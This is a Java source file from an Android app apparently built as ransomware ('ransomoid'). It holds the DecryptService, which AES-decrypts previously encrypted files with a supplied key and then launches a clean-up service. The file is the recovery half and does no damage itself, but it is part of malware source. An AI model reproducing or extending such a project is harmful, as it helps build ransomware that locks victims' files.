package falezza.fabio.ransomoid.services;

import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Base64;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;

import falezza.fabio.ransomoid.activities.DecryptActivity;
import falezza.fabio.ransomoid.utils.AesEncrypter;
import falezza.fabio.ransomoid.utils.FileProcessor;

public class DecryptService extends ParentService {

    private String key;

    public DecryptService() {
        super("DecryptService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        super.onHandleIntent(intent);
        this.key = intent.getDataString();
        this.decrypt();
    }

    private void decrypt() {
        // get Encrypted files to decrypt!
        this.showMessage("Decrypting...");
        try {
            AesEncrypter aesEncrypter = AesEncrypter.getInstance();
            aesEncrypter.setKey(Base64.decode(this.key, Base64.NO_WRAP));
            ArrayList<File> files = this.getEncryptedFiles();
            for (File img: files) {
                if (isEncrypted(img)) {
                    aesEncrypter.setFile(img);
                    byte[] decrypted = aesEncrypter.decrypt();
                    FileProcessor.getInstance().writeBytesToFile(decrypted, FileProcessor.getInstance().getDecryptFileName(img));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        this.showMessage("DONE");
        this.startCleanService();
    }

    public void startCleanService() {
        Intent intent = new Intent(this, CleanService.class);
        startService(intent);
    }
}
